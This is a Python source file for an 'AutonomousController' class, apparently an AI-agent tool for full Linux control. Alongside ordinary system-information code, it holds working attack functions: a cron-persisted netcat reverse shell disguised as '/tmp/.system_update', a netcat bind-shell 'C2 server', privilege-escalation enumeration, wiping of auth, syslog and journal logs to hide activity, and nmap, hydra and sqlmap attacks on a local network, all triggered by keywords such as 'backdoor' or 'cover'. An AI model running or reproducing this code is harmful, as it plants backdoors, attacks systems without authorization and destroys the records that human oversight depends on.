#!/usr/bin/env python3
"""
🤖 Autonomous Controller - Full System Control
Complete Linux terminal control and autonomous task execution
"""
import subprocess
import os
import time
import threading
import queue
import signal
import psutil
from pathlib import Path

class AutonomousController:
    def __init__(self):
        self.command_queue = queue.Queue()
        self.running_processes = {}
        self.system_info = self.get_system_info()
        self.privileges = self.check_privileges()
        
    def get_system_info(self):
        """Get comprehensive system information"""
        info = {
            "hostname": self.execute_command("hostname", capture=True),
            "kernel": self.execute_command("uname -r", capture=True),
            "distribution": self.execute_command("lsb_release -d", capture=True),
            "architecture": self.execute_command("uname -m", capture=True),
            "cpu_cores": psutil.cpu_count(),
            "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
            "disk_space": self.get_disk_space(),
            "network_interfaces": self.get_network_interfaces(),
            "running_services": self.get_running_services()
        }
        return info
    
    def check_privileges(self):
        """Check current user privileges"""
        privileges = {
            "is_root": os.geteuid() == 0,
            "sudo_access": self.execute_command("sudo -n true", capture=False, silent=True),
            "user": self.execute_command("whoami", capture=True),
            "groups": self.execute_command("groups", capture=True).split()
        }
        return privileges
    
    def execute_command(self, command, capture=False, silent=False, timeout=30, background=False):
        """Advanced command execution with full control"""
        try:
            if not silent:
                print(f"[AutonomousController] 🔧 Executing: {command}")
            
            if background:
                # Run command in background
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    preexec_fn=os.setsid
                )
                
                # Store process for management
                self.running_processes[command] = process
                return process.pid
            
            # Synchronous execution
            result = subprocess.run(
                command,
                shell=True,
                capture_output=capture,
                text=True,
                timeout=timeout
            )
            
            if capture:
                return result.stdout.strip() if result.returncode == 0 else ""
            else:
                return result.returncode == 0
                
        except subprocess.TimeoutExpired:
            if not silent:
                print(f"[AutonomousController] ⏰ Command timeout: {command}")
            return False
        except Exception as e:
            if not silent:
                print(f"[AutonomousController] ❌ Command failed: {command} - {e}")
            return False
    
    def execute_privileged_command(self, command, capture=False):
        """Execute command with elevated privileges"""
        if self.privileges["is_root"]:
            return self.execute_command(command, capture=capture)
        elif self.privileges["sudo_access"]:
            return self.execute_command(f"sudo {command}", capture=capture)
        else:
            print("[AutonomousController] ❌ Insufficient privileges for command")
            return False
    
    def install_package(self, package_name, package_manager="apt"):
        """Autonomously install system packages"""
        print(f"[AutonomousController] 📦 Installing {package_name}...")
        
        install_commands = {
            "apt": f"apt-get update && apt-get install -y {package_name}",
            "yum": f"yum install -y {package_name}",
            "pacman": f"pacman -S --noconfirm {package_name}",
            "dnf": f"dnf install -y {package_name}"
        }
        
        if package_manager in install_commands:
            return self.execute_privileged_command(install_commands[package_manager])
        else:
            print(f"[AutonomousController] ❌ Unknown package manager: {package_manager}")
            return False
    
    def manage_service(self, service_name, action):
        """Manage system services"""
        valid_actions = ["start", "stop", "restart", "enable", "disable", "status"]
        
        if action not in valid_actions:
            print(f"[AutonomousController] ❌ Invalid action: {action}")
            return False
        
        command = f"systemctl {action} {service_name}"
        return self.execute_privileged_command(command, capture=(action == "status"))
    
    def get_disk_space(self):
        """Get disk space information"""
        try:
            disk_usage = psutil.disk_usage('/')
            return {
                "total_gb": round(disk_usage.total / (1024**3), 2),
                "used_gb": round(disk_usage.used / (1024**3), 2),
                "free_gb": round(disk_usage.free / (1024**3), 2),
                "usage_percent": round((disk_usage.used / disk_usage.total) * 100, 2)
            }
        except:
            return {"error": "Unable to get disk information"}
    
    def get_network_interfaces(self):
        """Get network interface information"""
        try:
            interfaces = {}
            for interface, addrs in psutil.net_if_addrs().items():
                interfaces[interface] = []
                for addr in addrs:
                    if addr.family == 2:  # IPv4
                        interfaces[interface].append({
                            "type": "IPv4",
                            "address": addr.address,
                            "netmask": addr.netmask
                        })
            return interfaces
        except:
            return {"error": "Unable to get network information"}
    
    def get_running_services(self):
        """Get list of running services"""
        try:
            services = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    if proc.info['username'] == 'root':
                        services.append({
                            "pid": proc.info['pid'],
                            "name": proc.info['name']
                        })
                except:
                    continue
            return services[:20]  # Return top 20 services
        except:
            return []
    
    def monitor_system_resources(self):
        """Monitor system resources in real-time"""
        return {
            "cpu_percent": psutil.cpu_percent(interval=1),
            "memory_percent": psutil.virtual_memory().percent,
            "disk_percent": psutil.disk_usage('/').percent,
            "network_io": psutil.net_io_counters()._asdict(),
            "load_average": os.getloadavg()
        }
    
    def create_persistent_backdoor(self, port=4444):
        """Create persistent backdoor for continued access"""
        print(f"[AutonomousController] 🚪 Creating persistent backdoor on port {port}...")
        
        # Create netcat reverse shell
        backdoor_script = f"""#!/bin/bash
while true; do
    nc -e /bin/bash {self.get_external_ip()} {port}
    sleep 60
done
"""
        
        script_path = "/tmp/.system_update"
        
        try:
            with open(script_path, 'w') as f:
                f.write(backdoor_script)
            
            # Make executable
            os.chmod(script_path, 0o755)
            
            # Add to cron for persistence
            cron_entry = f"@reboot {script_path} > /dev/null 2>&1"
            self.execute_command(f"echo '{cron_entry}' | crontab -")
            
            # Start immediately in background
            self.execute_command(script_path, background=True)
            
            print(f"[AutonomousController] ✅ Persistent backdoor created on port {port}")
            return True
            
        except Exception as e:
            print(f"[AutonomousController] ❌ Failed to create backdoor: {e}")
            return False
    
    def escalate_privileges(self):
        """Attempt privilege escalation"""
        print("[AutonomousController] ⬆️ Attempting privilege escalation...")
        
        escalation_techniques = [
            # SUID binaries
            "find / -perm -4000 -type f 2>/dev/null",
            
            # Writable system files
            "find /etc -writable -type f 2>/dev/null",
            
            # Check sudo privileges
            "sudo -l",
            
            # Check for vulnerable services
            "ps aux | grep root",
            
            # Check for writable cron jobs
            "find /etc/cron* -writable 2>/dev/null"
        ]
        
        results = {}
        for technique in escalation_techniques:
            result = self.execute_command(technique, capture=True, silent=True)
            if result:
                results[technique] = result
        
        return results
    
    def clean_tracks(self):
        """Remove evidence of activity"""
        print("[AutonomousController] 🧹 Cleaning tracks...")
        
        cleanup_commands = [
            # Clear command history
            "history -c",
            "rm -f ~/.bash_history",
            "unset HISTFILE",
            
            # Clear system logs
            "echo '' > /var/log/auth.log",
            "echo '' > /var/log/syslog", 
            "echo '' > /var/log/wtmp",
            "echo '' > /var/log/lastlog",
            
            # Clear temporary files
            "rm -rf /tmp/*",
            "rm -rf /var/tmp/*",
            
            # Clear journal logs
            "journalctl --vacuum-time=1s"
        ]
        
        for cmd in cleanup_commands:
            self.execute_privileged_command(cmd, capture=False)
        
        print("[AutonomousController] ✅ Tracks cleaned")
    
    def get_external_ip(self):
        """Get external IP address"""
        try:
            import requests
            response = requests.get('https://ipinfo.io/ip', timeout=10)
            return response.text.strip()
        except:
            return "127.0.0.1"
    
    def autonomous_reconnaissance(self, target_network):
        """Perform autonomous network reconnaissance"""
        print(f"[AutonomousController] 🔍 Starting autonomous recon on {target_network}")
        
        recon_commands = [
            f"nmap -sn {target_network}",  # Host discovery
            f"nmap -sS -O {target_network}",  # TCP SYN scan with OS detection
            f"nmap -sU --top-ports 100 {target_network}",  # UDP scan
            f"nmap -sV -sC {target_network}",  # Service version and script scan
        ]
        
        results = {}
        for cmd in recon_commands:
            print(f"[AutonomousController] 🔧 Running: {cmd}")
            result = self.execute_command(cmd, capture=True, timeout=300)
            results[cmd] = result
            time.sleep(2)  # Avoid overwhelming the network
        
        return results
    
    def autonomous_exploitation(self, target_ip, discovered_services):
        """Perform autonomous exploitation based on discovered services"""
        print(f"[AutonomousController] 💥 Starting autonomous exploitation on {target_ip}")
        
        exploitation_results = []
        
        # Check for common vulnerabilities
        vuln_checks = [
            # SSH brute force
            f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target_ip} ssh",
            
            # FTP anonymous login
            f"nmap --script ftp-anon {target_ip}",
            
            # SMB vulnerabilities
            f"nmap --script smb-vuln* {target_ip}",
            
            # Web vulnerabilities
            f"nikto -h http://{target_ip}",
            
            # SQL injection
            f"sqlmap -u http://{target_ip} --batch --crawl=2"
        ]
        
        for cmd in vuln_checks:
            print(f"[AutonomousController] 🎯 Testing: {cmd}")
            result = self.execute_command(cmd, capture=True, timeout=600)
            if result and ("VULNERABLE" in result or "SUCCESS" in result):
                exploitation_results.append({
                    "command": cmd,
                    "result": result,
                    "status": "SUCCESS"
                })
        
        return exploitation_results
    
    def setup_command_and_control(self):
        """Setup command and control infrastructure"""
        print("[AutonomousController] 📡 Setting up C2 infrastructure...")
        
        # Create reverse shell handler
        c2_script = """#!/bin/bash
# Simple C2 server
while true; do
    nc -lvp 4444 -e /bin/bash
done
"""
        
        with open("/tmp/c2_server.sh", "w") as f:
            f.write(c2_script)
        
        os.chmod("/tmp/c2_server.sh", 0o755)
        
        # Start C2 server in background
        pid = self.execute_command("/tmp/c2_server.sh", background=True)
        
        print(f"[AutonomousController] ✅ C2 server started with PID: {pid}")
        return pid
    
    def autonomous_task_executor(self, task_description):
        """AI-powered autonomous task execution"""
        print(f"[AutonomousController] 🤖 Executing autonomous task: {task_description}")
        
        # Parse task and determine required actions
        task_lower = task_description.lower()
        
        actions_taken = []
        
        if "scan" in task_lower or "recon" in task_lower:
            # Perform network reconnaissance
            target = "192.168.1.0/24"  # Default target
            results = self.autonomous_reconnaissance(target)
            actions_taken.append(f"Network reconnaissance completed on {target}")
        
        if "exploit" in task_lower or "attack" in task_lower:
            # Perform exploitation
            results = self.autonomous_exploitation("192.168.1.1", [])
            actions_taken.append("Autonomous exploitation attempts completed")
        
        if "stealth" in task_lower or "hide" in task_lower:
            # Enable stealth mode
            from system.stealth_manager import StealthManager
            stealth = StealthManager()
            stealth.start_full_stealth_mode()
            actions_taken.append("Full stealth mode activated")
        
        if "persist" in task_lower or "backdoor" in task_lower:
            # Create persistence
            self.create_persistent_backdoor()
            actions_taken.append("Persistent backdoor created")
        
        if "clean" in task_lower or "cover" in task_lower:
            # Clean tracks
            self.clean_tracks()
            actions_taken.append("Activity tracks cleaned")
        
        return {
            "task": task_description,
            "actions_taken": actions_taken,
            "timestamp": time.time(),
            "status": "completed"
        }